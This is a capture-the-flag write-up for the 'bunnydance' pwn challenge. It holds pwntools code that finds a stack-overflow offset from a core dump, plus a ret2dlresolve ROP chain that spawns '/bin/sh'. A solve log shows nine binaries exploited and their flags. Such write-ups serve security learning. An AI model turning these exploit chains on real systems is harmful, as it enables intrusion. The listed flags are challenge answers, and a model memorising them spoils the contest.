# bunnydance

**Category**: Pwn \  
**Points**: 497 (9 solves) \  
**Author**: nsnc

## Challenge

Wait a minute isn't this just DARPA CGC LITE v3.0?

Guys seriously maybe we should stop putting this challenge in every CTF...

Difficulty: Medium

`chal.b01lers.com 4001`

## Overview

Server sends you 9 binaries in random order and you have to pwn them all to
get  
the flag.

Here's an example of one of the binaries:  
```c  
#include<stdio.h>

int main() {  
   setvbuf(stdin, 0, 2, 0);  
   setvbuf(stdout, 0, 2, 0);  
   setvbuf(stderr, 0, 2, 0);

   // break up main in random line increments into seperate functions  
   char input[48]; // buffer varies  
   puts("Name: "); // puts, printf, write, fwrite. print_output function, Text
varies  
   gets(input); // gets, fgets, scanf, strcpy, memcpy, fread  
   puts("Hello, "); // puts, printf, write, fwrite print_output function text
varies  
   puts(input);  
}  
```

## Solution

We're guaranteed a stack buffer overflow (no canary), so we can automatically  
calculate the offset to the stack return address like so:  
```python  
def get_rip_offset(chall):  
   # Generate a cyclic pattern so that we can auto-find the offset  
   payload = pwn.cyclic(128)

   # Run the process once so that it crashes  
   io = pwn.process(chall)  
   io.sendline(payload)  
   io.wait()

   # Get the core dump  
   core = pwn.Coredump("./core")

   # Our cyclic pattern should have been used as the crashing address  
   offset = pwn.cyclic_find(core.fault_addr & (2 ** 32 - 1))  
   return offset  
```

To pop a shell, we can just use ret2dlresolve.  
```python  
def get_ret2dlresolve(elf, offset):  
   # Pwntools script kiddie solution  
   bss = elf.bss(0x100 - 8)  
   ret2dl = pwn.Ret2dlresolvePayload(elf, "system", ["/bin/sh"], bss)  
   rop = pwn.ROP(elf)  
   rop.raw(rop.ret.address)  # ret gadget to align stack  
   rop.gets(bss)  
   rop.ret2dlresolve(ret2dl)  
   return b"A" * offset + rop.chain() + b"\n" + ret2dl.payload  
```

> I saw another solution that uses ret2libc (ropping to `puts` to print  
> `__libc_start_main`, then going back to `main` to overflow again)

Now we just have to wrap it in a pwntools script to interact with the server.  
Full script in `solve.py`, output:

```  
$ python3 solve.py  
[+] Opening connection to chal.b01lers.com on port 4001: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
[!] Could not find executable 'chall' in $PATH, using './chall' instead  
[+] Starting local process './chall': pid 33175  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33175)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x401203  
   RSP:       0x7fffa1690f28  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x400000)  
   Fault:     0x6161616c6161616b  
[*] Loaded 15 cached gadgets for 'chall'  
[+] Flag: b'bctf{th3_bunny_ate_all_the_carrots_what_4_p1g}'  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Starting local process './chall': pid 33179  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33179)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x4011f3  
   RSP:       0x7ffec95ee678  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x6161616661616165  
[+] Flag: b'bctf{(=^_^=)}'  
[+] Starting local process './chall': pid 33182  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33182)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x4011f3  
   RSP:       0x7ffda72cab58  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x6161616661616165  
[+] Flag: b'bctf{are_you_tired_of_pwning_yet...im_not!}'  
[+] Starting local process './chall': pid 33185  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33185)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x401237  
   RSP:       0x7ffe09ce76c8  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x6161616c6161616b  
[*] Loaded 14 cached gadgets for 'chall'  
[+] Flag: b'bctf{1tz_h4ll0w33n_1n_r3v3rse}'  
[+] Starting local process './chall': pid 33189  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33189)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x401203  
   RSP:       0x7ffdf68fe068  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x6161616c6161616b  
[+] Flag: b'bctf{put_the_eggs_in_the_basket_old_man}'  
[+] Starting local process './chall': pid 33193  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33193)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x401217  
   RSP:       0x7ffef4d5dfb8  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x6161616661616165  
[+] Flag: b'bctf{an1m4l_cr0ss1ng_t0day_looks_m0re_fun_than_ctf}'  
[+] Starting local process './chall': pid 33199  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33199)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x4011f3  
   RSP:       0x7ffec112ca18  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x616161706161616f  
[+] Flag: b'bctf{stop_k1d_th4ts_n0t_the_34ster_bunny}'  
[+] Starting local process './chall': pid 33202  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33202)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x401217  
   RSP:       0x7ffeda483788  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x616161706161616f  
[+] Flag: b'bctf{ch0c0late_bunnies_r_l1k3_chal_authors_hollow_and_annoying}'  
[+] Starting local process './chall': pid 33205  
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 33205)  
[+] Parsing corefile...: Done  
[*] '/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/core'  
   Arch:      amd64-64-little  
   RIP:       0x4011f3  
   RSP:       0x7ffdbacb8fb8  
   Exe:
'/home/plushie/Programs/bbb_writeups/2021/b01lers_ctf/bunnydance/chall'
(0x401000)  
   Fault:     0x616161706161616f  
[+] Flag: b'bctf{b0utt4_ch0k3_on_a_cadbury_cr3am_egg_th1s_y3ar}'  
[*] Switching to interactive mode  
flag{n0w_d0_th3_bunnyd4nc3}  
Time hops on...  
[*] Got EOF while reading in interactive  
```  

Original writeup (https://github.com/cscosu/ctf-
writeups/tree/master/2021/b01lers_ctf/bunnydance).